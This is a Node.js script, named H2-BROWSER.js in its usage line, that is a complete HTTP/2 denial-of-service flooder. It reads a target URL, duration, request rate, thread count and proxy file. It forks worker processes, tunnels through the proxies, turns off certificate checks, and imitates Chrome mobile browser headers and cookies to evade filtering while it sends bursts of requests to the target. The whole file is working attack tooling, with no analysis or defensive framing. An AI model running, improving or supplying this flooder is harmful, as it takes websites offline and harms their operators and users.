const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});

if (process.argv.length < 7) {
  console.log(
    `Usage: node H2-BROWSER.js [TARGET] [TIME] [RATE] [THREAD] [PROXY FILE]`
  );
  process.exit();
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

const ciphersList = [
  "ECDHE-ECDSA-AES128-GCM-SHA256:" +
    "ECDHE-RSA-AES128-GCM-SHA256:" +
    "ECDHE-ECDSA-AES256-GCM-SHA384:" +
    "ECDHE-RSA-AES256-GCM-SHA384:" +
    "ECDHE-ECDSA-CHACHA20-POLY1305:" +
    "ECDHE-RSA-CHACHA20-POLY1305:" +
    "DHE-RSA-AES128-GCM-SHA256:" +
    "DHE-RSA-AES256-GCM-SHA384",
];
const ciphers = ciphersList[0];

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(arr) {
  return arr[randomIntn(0, arr.length)];
}

class NetSocket {
  HTTP(options, callback) {
    const payload =
      `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
      `Host: ${options.address}:443\r\n` +
      `Proxy-Connection: keep-alive\r\n\r\n`;
    const buffer = Buffer.from(payload);

    const connection = net.connect({ host: options.host, port: options.port });

    connection.setTimeout(options.timeout * 1000);
    connection.setKeepAlive(true, 100000);

    connection.once("connect", () => {
      connection.write(buffer);
    });

    connection.once("data", (chunk) => {
      const res = chunk.toString("utf8");
      if (res.includes("HTTP/1.1 200")) {
        callback(connection, null);
      } else {
        connection.destroy();
        callback(null, "Invalid proxy response");
      }
    });

    connection.once("timeout", () => {
      connection.destroy();
      callback(null, "Proxy connection timeout");
    });

    connection.once("error", () => {
      connection.destroy();
      callback(null, "Proxy connection error");
    });
  }
}

const Socker = new NetSocket();

if (cluster.isMaster) {
  for (let i = 0; i < args.threads; i++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

const userAgentsList = [
  "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
];

const cookiesList = [
  "sessionid=abc123; path=/; HttpOnly",
  "sessionid=def456; path=/; HttpOnly",
  "sessionid=ghi789; path=/; HttpOnly",
];

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  if (!proxyAddr) return;

  const [proxyHost, proxyPort] = proxyAddr.split(":");
  if (!proxyHost || !proxyPort) return;

  const userAgent = randomElement(userAgentsList);
  const cookie = randomElement(cookiesList);

  const headers = {
    ":method": "GET",
    ":path": parsedTarget.path,
    ":scheme": "https",
    ":authority": parsedTarget.host,
    "user-agent": userAgent,
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "accept-encoding": "gzip, deflate, br",
    referer: `https://${parsedTarget.host}/`,
    origin: `https://${parsedTarget.host}`,
    "sec-ch-ua":
      '"Chromium";v="115", "Not A(Brand";v="24", "Google Chrome";v="115"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    cookie: cookie,
  };

  const proxyOptions = {
    host: proxyHost,
    port: ~~proxyPort,
    address: parsedTarget.host,
    timeout: 5,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error || !connection) return;

    const tlsOptions = {
      socket: connection,
      servername: parsedTarget.hostname,
      ALPNProtocols: ["h2"],
      ciphers: ciphers,
      ecdhCurve: "X25519:P-256:P-384:P-521",
      honorCipherOrder: true,
      rejectUnauthorized: false,
      secureOptions:
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_COMPRESSION,
    };

    const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions);

    tlsConn.setKeepAlive(true, 10000);

    const client = http2.connect(parsedTarget.href, {
      createConnection: () => tlsConn,
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
    });

    client.on("connect", () => {
      const attackInterval = setInterval(() => {
        for (let i = 0; i < args.rate; i++) {
          const req = client.request(headers);

          req.on("response", () => {
            req.close();
            req.destroy();
          });

          req.end();
        }
      }, 1000);

      client.on("close", () => clearInterval(attackInterval));
      client.on("error", () => {
        clearInterval(attackInterval);
        client.destroy();
        connection.destroy();
      });
    });

    client.on("error", () => {
      client.destroy();
      connection.destroy();
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
    });
  });
}

setTimeout(() => process.exit(0), args.time * 1000);